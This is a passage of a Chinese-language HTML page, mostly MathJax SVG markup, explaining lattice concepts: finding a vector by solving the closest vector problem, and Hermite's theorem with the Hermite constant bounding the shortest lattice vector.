550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="msub" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(1643.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(2644,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mtd" transform="translate(9788,0)"><g data-mml-node="mo"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"/></g></g><g data-mml-node="mtd" transform="translate(11960,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="msub" transform="translate(500,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(1714.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(2714.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></g><g data-mml-node="mo" transform="translate(15452.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g></g><g data-mml-node="mi" transform="translate(15763.7,477.1) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">  </font></p>
<p><font style="color:rgb(0, 0, 0);">则我们可以通过解决CVP来找到</font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.018ex;" xmlns="http://www.w3.org/2000/svg" width="1.283ex" height="1.043ex" role="img" focusable="false" viewbox="0 -453 567 461"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g></g></g></svg></mjx-container></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h2 id="RBPcc"><font style="color:rgb(0, 0, 0);">Hermite定理</font></h2>
<font style="color:rgb(0, 0, 0);">最短向量到底多长?</font>

<p><font style="color:rgb(0, 0, 0);">Hermite定理：对于 n 维的格 L</font><em><font style="color:rgb(0, 0, 0);"> </font></em><font style="color:rgb(0, 0, 0);">，都包含一个非零向量 </font><strong><font style="color:rgb(0, 0, 0);">v</font></strong><font style="color:rgb(0, 0, 0);">∈</font><font style="color:rgb(0, 0, 0);">L</font><em><font style="color:rgb(0, 0, 0);"> </font></em><font style="color:rgb(0, 0, 0);">满足</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                              </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.438ex" height="2.587ex" role="img" focusable="false" viewbox="0 -893.3 8149.6 1143.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mo" transform="translate(845,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(1400.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"/></g><g data-mml-node="msqrt" transform="translate(2456.6,0)"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(0,-17)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"/></g><rect width="600" height="60" x="853" y="723"/></g><g data-mml-node="mo" transform="translate(4076.2,0)"><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(556,0)"/><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(5465.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5854.2,0)"><g data-mml-node="mi"><path data-c="1D40B" d="M643 285Q641 280 629 148T612 4V0H39V62H147V624H39V686H51Q75 683 228 683Q415 685 425 686H439V624H304V62H352H378Q492 62 539 138Q551 156 558 178T569 214T576 255T581 289H643V285Z"/></g></g><g data-mml-node="msup" transform="translate(6546.2,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mi" transform="translate(1000,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container></p>
<p><font style="color:rgb(0, 0, 0);">其中 det⁡(L) 代表计算 L</font><em><font style="color:rgb(0, 0, 0);"> </font></em><font style="color:rgb(0, 0, 0);">的行列式。于是我们知道了一个关于最短向量的上界。实际上对于这里还有衍生Hermite常数 γn ，有</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                              </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.603ex" height="2.587ex" role="img" focusable="false" viewbox="0 -893.3 8222.4 1143.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="msup" transform="translate(845,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(311,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(1837.3,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"/></g><g data-mml-node="msub" transform="translate(2893.1,0)"><g data-mml-node="mi"><path data-c="1D6FE" d="M31 249Q11 249 11 258Q11 275 26 304T66 365T129 418T206 441Q233 441 239 440Q287 429 318 386T371 255Q385 195 385 170Q385 166 386 166L398 193Q418 244 443 300T486 391T508 430Q510 431 524 431H537Q543 425 543 422Q543 418 522 378T463 251T391 71Q385 55 378 6T357 -100Q341 -165 330 -190T303 -216Q286 -216 286 -188Q286 -138 340 32L346 51L347 69Q348 79 348 100Q348 257 291 317Q251 355 196 355Q148 355 108 329T51 260Q49 251 47 251Q45 249 31 249Z"/></g><g data-mml-node="mi" transform="translate(551,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(4085,0)"><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(556,0)"/><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(5474,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(5863,0)"><path data-c="1D473" d="M258 624H235Q214 624 209 626T199 639Q203 678 216 684Q220 686 239 686Q290 684 409 684Q454 684 492 684T552 685T579 686Q603 686 603 668Q599 632 587 626Q583 624 520 624H457L388 344Q317 64 317 63T353 62H390Q418 62 440 64T493 78T548 110T598 169T643 261Q651 282 655 285T680 289Q696 289 700 288T709 279Q711 274 711 269Q710 265 663 138T613 8Q611 4 602 0H58Q47 5 43 15Q47 54 60 60Q64 62 113 62H162L302 623Q302 624 258 624Z"/></g><g data-mml-node="msup" transform="translate(6619,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mi" transform="translate(1000,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);"> </font></p>
<p><font style="color:rgb(0, 0, 0);">其中</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                              </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex;" xmlns="http://www.w3.org/2000/svg" width="14.459ex" height="2.397ex" role="img" focusable="false" viewbox="0 -706.5 6391.1 1059.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mi" transform="translate(550.9,394) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mrow" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"/></g><g data-mml-node="mi" transform="translate(1070,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g><rect width="1286.1" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(1803.9,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"/></g><g data-mml-node="msub" transform="translate(2859.7,0)"><g data-mml-node="mi"><path data-c="1D6FE" d="M31 249Q11 249 11 258Q11 275 26 304T66 365T129 418T206 441Q233 441 239 440Q287 429 318 386T371 255Q385 195 385 170Q385 166 386 166L398 193Q418 244 443 300T486 391T508 430Q510 431 524 431H537Q543 425 543 422Q543 418 522 378T463 251T391 71Q385 55 378 6T357 -100Q341 -165 330 -190T303 -216Q286 -216 286 -188Q286 -138 340 32L346 51L347 69Q348 79 348 100Q348 257 291 317Q251 355 196 355Q148 355 108 329T51 260Q49 251 47 251Q45 249 31 249Z"/></g><g data-mml-node="mi" transform="translate(551,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(4162.7,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"/></g><g data-mml-node="mfrac" transform="translate(5218.5,0)"><g data-mml-node="mi" transform="translate(374.1,394) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mrow" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"/></g><g data-mml-node="mi" transform="translate(570,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 